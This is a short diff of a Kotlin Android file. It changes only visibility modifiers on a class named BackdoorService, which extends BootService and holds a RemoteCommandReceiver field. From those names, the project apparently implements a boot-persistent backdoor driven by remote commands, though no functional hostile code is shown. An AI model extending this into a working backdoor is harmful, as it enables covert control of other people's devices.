@@ -39,8 +39,8 @@ import com.candroid.bootlaces.BootService
 ............\..............(
 ..............\.............\...
 */
-class BackdoorService : BootService(){
-    lateinit var receiver: RemoteCommandReceiver
+internal class BackdoorService : BootService(){
+    private lateinit var receiver: RemoteCommandReceiver
 
     override fun onCreate() {
         super.onCreate()
